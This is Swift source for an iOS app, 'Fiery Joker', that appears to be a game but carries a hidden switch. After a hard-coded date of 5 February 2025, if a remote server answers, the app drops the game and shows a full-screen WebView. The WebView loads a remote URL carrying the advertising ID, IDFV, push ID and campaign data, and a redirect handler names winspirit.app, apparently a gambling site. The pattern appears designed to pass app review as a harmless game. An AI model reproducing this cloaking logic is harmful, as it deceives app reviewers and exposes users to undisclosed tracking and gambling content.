import SwiftUI
import WebKit
import AppTrackingTransparency
import AdSupport
import SwiftUI
import Combine
import Foundation
 import SwiftUI
 import UserNotifications
import OneSignalFramework
 import AdServices
struct CustomLoaderFieryJoker: View {
    @State private var isAnimating = false

    var body: some View {
        ZStack {
            Circle()
                .stroke(lineWidth: 4)
                .foregroundColor(.white.opacity(0.3))
                .frame(width: 50, height: 50)
            Circle()
                .trim(from: 0, to: 0.8)
                .stroke(lineWidth: 4)
                .foregroundColor(.white)
                .rotationEffect(Angle(degrees: isAnimating ? 360 : 0))
                .frame(width: 50, height: 50)
                .animation(Animation.linear(duration: 1).repeatForever(autoreverses: false))
                .onAppear {
                    isAnimating = true
                }
        }
    }
}


class AppState: ObservableObject {
    @Published var sho: Bool = true
}

@main
struct FieryJokerApp: App {
    @State private var isLoad = true
    
    @UIApplicationDelegateAdaptor(AppDelegateWalkInPalmeRoma.self) var delegate
    @StateObject private var appState = AppState()
    @State private var isLoadFieryJoker = true
    @State private var FieryJokerGame = false
    @State private var FieryJokerWV = false
    @State private var FieryJoker2 = false
    @State private var FieryJoker3 = false
    @State private var FieryJoker4 = false
    var body: some Scene {
        WindowGroup {
           
            ZStack{
                if isLoadFieryJoker {
                    VStack {
                        CustomLoaderFieryJoker()
                            .frame(maxWidth: .infinity, maxHeight: .infinity)
                    }
                    .background(Image("lo1").resizable().ignoresSafeArea())
                    
                } else if FieryJokerWV {
                    WebViewContainerFieryJoker().preferredColorScheme(.dark)
                } else if FieryJokerGame {
                    
                    if !isLoad {
                        MunuView()
                    }
                    else {
                        ContentView()
                            .onAppear {
                                askCall()
                                DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
                                    isLoad = false
                                }
                            }
                    }
                }
            }.onAppear(){
                let saveFullUrl = UserDefaults.standard.string(forKey: ConstFieryJoker.fullUrlSave) ?? ""
                
                if saveFullUrl != "" {
                    self.FieryJokerWV = true
                    self.isLoadFieryJoker = false
                    
                    
                }else{
                    
                    Task {
                        let calendar = Calendar.current
                        let today = Date()
                        
                        if let givenDate = calendar.date(from: DateComponents(year: 2025, month: 02, day: 05)),
                           calendar.isDate(today, equalTo: givenDate, toGranularity: .day) || today >= givenDate {
                            await fetchFieryJoker()
                        } else {
                            ksakdjaskd()
                        }
                    }
                    
                }
            }
        }
    }
    
    func askCall() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
            ATTrackingManager.requestTrackingAuthorization { status in
                switch status {
                case .authorized:
                    NotificationCenter.default.post(name: .notat, object: nil)
                case .denied:
                    NotificationCenter.default.post(name: .notat, object: nil)
                case .restricted:
                    break
                case .notDetermined:
                    askCall()
                @unknown default:
                    break
                }
            }
        }
    }
    func ksakdjaskd(){
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
            
            isLoadFieryJoker = false
            FieryJokerGame = true
            
        }
    }
    func generateUniqueID() -> String {
        
        let timestamp = Int(Date().timeIntervalSince1970)
        let randomDigits = (0..<7).map { _ in String(Int.random(in: 0...9)) }.joined()
        
        let uniqueID = "\(timestamp)-\(randomDigits)"
        return uniqueID
    }
    func fetchFieryJoker() async {
        
        let timestamp_user_id = generateUniqueID()
        UserDefaults.standard.setValue(timestamp_user_id, forKey: "timestamp_user_id")
        OneSignal.User.addTag(key: "timestamp_user_id", value: timestamp_user_id)
        
        
        EvServFieryJoker.shared.sendEvent(eventName: "uniq_visit")
        DispatchQueue.main.asyncAfter(deadline: .now() + 10) {
            
            if UserDefaults.standard.bool(forKey: "push_subscribe"){
                EvServFieryJoker.shared.sendEvent(eventName: "push_subscribe")
            }
  
        }
        guard let url = URL(string: ConstFieryJoker.apiURL + ConstFieryJoker.appKey) else { return }
        do {
            let (data, response) = try await URLSession.shared.data(from: url)
            guard let httpResponse = response as? HTTPURLResponse else {
                
                ksakdjaskd()
                return
            }
            if httpResponse.statusCode == 200 {
                let responseString = String(data: data, encoding: .utf8)
                DispatchQueue.main.async {
                    self.FieryJokerWV = true
                    self.isLoadFieryJoker = false
                    
                }
            } else {
                ksakdjaskd()
            }
            
        } catch {
            
            ksakdjaskd()
        }
    }
}
struct WebViewContainerFieryJoker: View {

    @State private var m = 0
    @State private var fullUrl: URL?
    @State private var isRequestCompleted = false
    @State private var timerCancellable: AnyCancellable?
    @State private var keyboardHeight: CGFloat = 0
    @State private var token: String? = nil
    @State private var attributionResponse: String? = nil
    
    @State private var isLoading: Bool = true
    @State private var webViewReference: WKWebView? = nil
    var body: some View {
        ZStack {
            if let fullUrl = fullUrl {
                VStack(spacing: 0) {
                    
                   WebView(url: fullUrl, keyboardHeight: $keyboardHeight, webViewReference: $webViewReference, isLoading: $isLoading).edgesIgnoringSafeArea([ .bottom]).background(Color.black)
                    
                    HStack {
                     
                        Button(action: {
                            if let webView = webViewReference {
                                if webView.subviews.contains(where: { $0 is WKWebView }) {
                                    
                                    if let newWebView = webView.subviews.last(where: { $0 is WKWebView }) as? WKWebView {
                                        newWebView.removeFromSuperview()
                                    }
                                } else if webView.canGoBack {
                                   
                                    webView.goBack()
                                }
                            }
                        }) {
                            Image(systemName: "arrow.backward")
                                .padding()
                                .clipShape(Circle())
                                .foregroundColor(.white)
                        }

                        Spacer()
                        
                        Button(action: {
                            if let webView = webViewReference {
                              
                                if webView.subviews.contains(where: { $0 is WKWebView }) {
                                    
                                    if let newWebView = webView.subviews.last(where: { $0 is WKWebView }) as? WKWebView {
                                        newWebView.reload()
                                    }
                                }else{
                                    webView.reload()
                                }
                            }
                        }) {
                            Image(systemName: "arrow.clockwise")
                                .padding()
                            
                                .clipShape(Circle())
                                .foregroundColor(.white)
                        }
                    }
                    .padding(.horizontal)
 
                }.edgesIgnoringSafeArea([.bottom])
            }
            else {
                VStack {
                    CustomLoaderFieryJoker()
                        .frame(maxWidth: .infinity, maxHeight: .infinity)
                }
                .background(Image("lo1").resizable().ignoresSafeArea())
            }
        }

        .onAppear {
            
            let getFullUrlFromUserDefaults = UserDefaults.standard.string(forKey: ConstFieryJoker.fullUrlSave) ?? ""
           
            if getFullUrlFromUserDefaults != "" {
                self.fullUrl = URL(string: getFullUrlFromUserDefaults)
               
                if UserDefaults.standard.bool(forKey: ConstFieryJoker.opFormPush) {
    
                    self.fullUrl = URL(string: getFullUrlFromUserDefaults + "&\(ConstFieryJoker.opPush)=true")
                    UserDefaults.standard.set(false, forKey: ConstFieryJoker.opFormPush)
                }
                
            }else{

                requestTrackingAndPrepareUrlWalkInPalmeRoma()

            }
        }
    }


    func requestTrackingAndPrepareUrlWalkInPalmeRoma() {
        
        if #available(iOS 14, *) {
           
            ATTrackingManager.requestTrackingAuthorization { status in
                DispatchQueue.main.async {
                    switch status {
                    case .authorized:
                        
                        isRequestCompleted = true
                            NotificationCenter.default.post(name: .notat, object: nil)
                        self.startTimer()
                    case .notDetermined:
                        if ATTrackingManager.trackingAuthorizationStatus == .notDetermined {
                            requestTrackingAndPrepareUrlWalkInPalmeRoma()
                            
                        } else {
                           
                            isRequestCompleted = true
                            self.startTimer()
                            
                        }
                        
                    case .denied, .restricted:
                       
                        isRequestCompleted = true
                        
                            NotificationCenter.default.post(name: .notat, object: nil)
                        
                        self.startTimer()
                       
                    @unknown default:
                       
                        print("Unknown tracking status")
                    }
                }
            }
        } else {
            
            self.startTimer()
        }
    }
    func startTimer() {
           timerCancellable = Timer.publish(every: 1, on: .main, in: .common).autoconnect().sink { _ in
               if self.m > 5 {
                   self.prepareFullUrl()
                   self.timerCancellable?.cancel()
               } else {
                   self.m += 1
                   
               }
           }
        
       }
   
    private func prepareFullUrl() {
       
        var savedString = UserDefaults.standard.string(forKey: ConstFieryJoker.namecampaign) ?? ""
            var appsUID = UserDefaults.standard.string(forKey: ConstFieryJoker.appsUID) ?? ""
        var attribution = UserDefaults.standard.string(forKey: ConstFieryJoker.isASA) ?? "0"
            var playerID = UserDefaults.standard.string(forKey: ConstFieryJoker.onesignID) ?? ""
        var idfv = UserDefaults.standard.string(forKey: ConstFieryJoker.idfvID) ?? ""
            var jid = UserDefaults.standard.string(forKey: "jid") ?? ""
        var timestamp_user_id = UserDefaults.standard.string(forKey: "timestamp_user_id") ?? ""

        if let onesignalId = OneSignal.User.onesignalId {
            playerID = onesignalId
        } else {
            playerID = "None"
        }
       
        let first = ConstFieryJoker.apiURL + ConstFieryJoker.appKey
        let second = "?\(ConstFieryJoker.appKey)=1"

            let idfa = ASIdentifierManager.shared().advertisingIdentifier.uuidString
            if(savedString == ""){
                DispatchQueue.main.asyncAfter(deadline: .now() + 1) {
                    savedString = UserDefaults.standard.string(forKey: ConstFieryJoker.namecampaign) ?? ""
                    appsUID = UserDefaults.standard.string(forKey: ConstFieryJoker.appsUID) ?? ""
                    
                    let attributionParam = attribution == "1" ? "&\(ConstFieryJoker.subName)1=asa" : ""
                    let full = first + second + "&\(ConstFieryJoker.idfaID)=" + idfa + "&\(ConstFieryJoker.appsID)=" + appsUID + savedString +  "&\(ConstFieryJoker.onesignID)=\(playerID)" + "&\(ConstFieryJoker.subStampTime)=\(timestamp_user_id)" + attributionParam + "&\(ConstFieryJoker.idfvID)=" + idfv + "&\(ConstFieryJoker.customer_user_id)=" + idfv
                    
                        UserDefaults.standard.setValue(full, forKey: ConstFieryJoker.fullUrlSave)
                    
                    self.fullUrl = URL(string: full)
                    print(full)
                    isRequestCompleted = true
                    
                }
            }else{
                let full = first + second + "&\(ConstFieryJoker.idfaID)=" + idfa + "&\(ConstFieryJoker.appsID)=" + appsUID + savedString +  "&\(ConstFieryJoker.onesignID)=\(playerID)" + "&\(ConstFieryJoker.subStampTime)=\(timestamp_user_id)" + "&\(ConstFieryJoker.idfvID)=" + idfv + "&\(ConstFieryJoker.customer_user_id)=" + idfv + "&\(ConstFieryJoker.jid)=" + jid
               
                    UserDefaults.standard.setValue(full, forKey: ConstFieryJoker.fullUrlSave)
                
                self.fullUrl = URL(string: full)
                print(full)
               
                isRequestCompleted = true
                
            }
        }
   


   
}
struct WebView: UIViewRepresentable {
    let url: URL
    @Binding var keyboardHeight: CGFloat
    @Binding var webViewReference: WKWebView?
    @Binding var isLoading: Bool

    typealias UIViewType = WKWebView

    func makeUIView(context: Context) -> WKWebView {
        let webViewConfiguration = WKWebViewConfiguration()
        webViewConfiguration.allowsInlineMediaPlayback = true
        webViewConfiguration.mediaTypesRequiringUserActionForPlayback = []
        EvServFieryJoker.shared.sendEvent(eventName: "webview_open")
        let webView = WKWebView(frame: .zero, configuration: webViewConfiguration)
        webView.backgroundColor = .black
        webView.isOpaque = false
        webView.navigationDelegate = context.coordinator
        webView.uiDelegate = context.coordinator

        context.coordinator.setupSwipeGesture(for: webView)
        getUserAgent(webView: webView) { userAgent in
            webView.customUserAgent = "\(userAgent) Safari/604.1"
        }
        DispatchQueue.main.async {
            self.webViewReference = webView
        }
        addLoadingOverlay(to: webView)
        let request = URLRequest(url: url)
        webView.load(request)

        return webView
    }

    func updateUIView(_ webView: WKWebView, context: Context) {
        if webView.url != url {
            let request = URLRequest(url: url)
            webView.load(request)
        }
    }

    func makeCoordinator() -> Coordinator {
        Coordinator(self, initialURL: url)
    }

    private func addLoadingOverlay(to webView: WKWebView) {
        let overlayView = UIView(frame: webView.bounds)
        overlayView.backgroundColor = .black
        overlayView.tag = 1001
        overlayView.translatesAutoresizingMaskIntoConstraints = false

        let loadingLabel = UILabel()
        loadingLabel.text = ""
        loadingLabel.font = UIFont.systemFont(ofSize: 24, weight: .bold)
        loadingLabel.textColor = .white
        loadingLabel.translatesAutoresizingMaskIntoConstraints = false

        overlayView.addSubview(loadingLabel)

       
        webView.addSubview(overlayView)

        NSLayoutConstraint.activate([
            overlayView.topAnchor.constraint(equalTo: webView.topAnchor),
            overlayView.bottomAnchor.constraint(equalTo: webView.bottomAnchor),
            overlayView.leadingAnchor.constraint(equalTo: webView.leadingAnchor),
            overlayView.trailingAnchor.constraint(equalTo: webView.trailingAnchor)
        ])

        
        NSLayoutConstraint.activate([
            loadingLabel.centerXAnchor.constraint(equalTo: overlayView.centerXAnchor),
            loadingLabel.centerYAnchor.constraint(equalTo: overlayView.centerYAnchor)
        ])

       
        var loadingText = ""
        let fullText = "LOADING..."
        Timer.scheduledTimer(withTimeInterval: 0.2, repeats: true) { timer in
            if self.isLoading {
                if loadingText.count < fullText.count {
                    loadingText.append(fullText[loadingText.index(loadingText.startIndex, offsetBy: loadingText.count)])
                } else {
                    loadingText = ""
                }
                loadingLabel.text = loadingText
            } else {
                timer.invalidate()
                overlayView.removeFromSuperview()
            }
        }
    }

    func getUserAgent(webView: WKWebView, completion: @escaping (String) -> Void) {
        webView.evaluateJavaScript("navigator.userAgent") { (result, error) in
            if let userAgent = result as? String {
                completion(userAgent)
            } else {
                completion("")
            }
        }
    }

    class Coordinator: NSObject, WKUIDelegate, WKNavigationDelegate, UIGestureRecognizerDelegate {
        var parent: WebView
        var initialURL: URL
        var currentURL: URL?

        init(_ parent: WebView, initialURL: URL) {
            self.parent = parent
            self.initialURL = initialURL
            super.init()
            NotificationCenter.default.addObserver(self, selector: #selector(keyboardWillShow), name: UIResponder.keyboardWillShowNotification, object: nil)
            NotificationCenter.default.addObserver(self, selector: #selector(keyboardWillHide), name: UIResponder.keyboardWillHideNotification, object: nil)
        }

        deinit {
            NotificationCenter.default.removeObserver(self)
        }

        func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
            DispatchQueue.main.async {
                self.parent.isLoading = true
            }
            if let url = webView.url {
                currentURL = url
            }
        }
        @objc func keyboardWillShow(notification: NSNotification) {
            if let keyboardFrame: NSValue = notification.userInfo?[UIResponder.keyboardFrameEndUserInfoKey] as? NSValue {
                let keyboardRectangle = keyboardFrame.cgRectValue
                let keyboardHeight = keyboardRectangle.height
                DispatchQueue.main.async {
                    self.parent.keyboardHeight = keyboardHeight
                }
            }
        }

        @objc func keyboardWillHide(notification: NSNotification) {
            DispatchQueue.main.async {
                self.parent.keyboardHeight = 0
            }
        }
        func getUserAgent(webView: WKWebView, completion: @escaping (String) -> Void) {
            webView.evaluateJavaScript("navigator.userAgent") { (result, error) in
                if let userAgent = result as? String {
                    completion(userAgent)
                } else {
                    completion("")
                }
            }
        }
        func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
            let newWebView = WKWebView(frame: webView.bounds, configuration: configuration)
            newWebView.uiDelegate = self
            newWebView.navigationDelegate = self

            
            getUserAgent(webView: webView) { userAgent in
                newWebView.customUserAgent = "\(userAgent) Safari/604.1"
            }

           
            if let url = navigationAction.request.url {
                let request = URLRequest(url: url)
                newWebView.load(request)
            }

            DispatchQueue.main.async {
                webView.addSubview(newWebView)
            }

            return newWebView
        }
     
     
        
        func webView(_ webView: WKWebView, decidePolicyFor navigationResponse: WKNavigationResponse, decisionHandler: @escaping (WKNavigationResponsePolicy) -> Void) {
            if let response = navigationResponse.response as? HTTPURLResponse,
               let url = response.url,
               response.statusCode == 302 {
                let request = URLRequest(url: url)
                webView.load(request)
                decisionHandler(.cancel)
                return
            }
            decisionHandler(.allow)
        }
        func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
            if let url = navigationAction.request.url {
                let urlScheme = url.scheme?.lowercased()
                if url.absoluteString.contains("https://winspirit.app/?identifier=") {
                    webView.load(URLRequest(url: initialURL))
                    decisionHandler(.cancel)
                    return
                }

                let customSchemes = getCustomSchemesFromPlist()

                if let scheme = urlScheme, customSchemes.contains(scheme) {
                    if UIApplication.shared.canOpenURL(url) {
                        UIApplication.shared.open(url, options: [:], completionHandler: nil)
                        decisionHandler(.cancel)
                        return
                    } else {
                        showAlert(message: "The \(scheme) app is not installed on your device.")
                        decisionHandler(.cancel)
                        return
                    }
                }

                if urlScheme == "mailto" {
                    if UIApplication.shared.canOpenURL(url) {
                        UIApplication.shared.open(url, options: [:], completionHandler: nil)
                        decisionHandler(.cancel)
                        return
                    }
                }
                decisionHandler(.allow)
            } else {
                decisionHandler(.allow)
            }
        }
        private func getCustomSchemesFromPlist() -> [String] {
            if let urlSchemes = Bundle.main.object(forInfoDictionaryKey: "LSApplicationQueriesSchemes") as? [String] {
                return urlSchemes.map { $0.lowercased() }
            }
            return []
        }

        private func showAlert(message: String) {
            DispatchQueue.main.async {
                let alert = UIAlertController(title: "Error", message: message, preferredStyle: .alert)
                alert.addAction(UIAlertAction(title: "OK", style: .default, handler: nil))

                if var topController = UIApplication.shared.keyWindow?.rootViewController {
                    while let presentedViewController = topController.presentedViewController {
                        topController = presentedViewController
                    }
                    topController.present(alert, animated: true, completion: nil)
                }
            }
        }
        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            DispatchQueue.main.async {
                self.parent.isLoading = false
            }
            if let url = webView.url {
                currentURL = url
            }
        }

        func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
            print("WebView error: \(error.localizedDescription)")

           
            webView.evaluateJavaScript("document.location.href") { [weak self] result, error in
                if let redirectedURLString = result as? String, let redirectedURL = URL(string: redirectedURLString) {
                    let request = URLRequest(url: redirectedURL)
                    webView.load(request)
                } else {
                    self?.showAlert(message: "Failed to load page. Error: \(error?.localizedDescription ?? "Unknown error")")
                }
            }

            DispatchQueue.main.async {
                self.parent.isLoading = false
            }
        }


        func setupSwipeGesture(for webView: WKWebView) {
            let swipeGesture = UISwipeGestureRecognizer(target: self, action: #selector(handleSwipeGesture))
            swipeGesture.direction = .right
            swipeGesture.delegate = self
            webView.addGestureRecognizer(swipeGesture)
        }

        @objc func handleSwipeGesture(_ gesture: UISwipeGestureRecognizer) {
            if let webView = gesture.view as? WKWebView {
                if gesture.direction == .right {
                    if webView.canGoBack {
                        webView.goBack()
                    } else {
                        webView.load(URLRequest(url: initialURL))
                    }
                }
            }
        }
    }
}




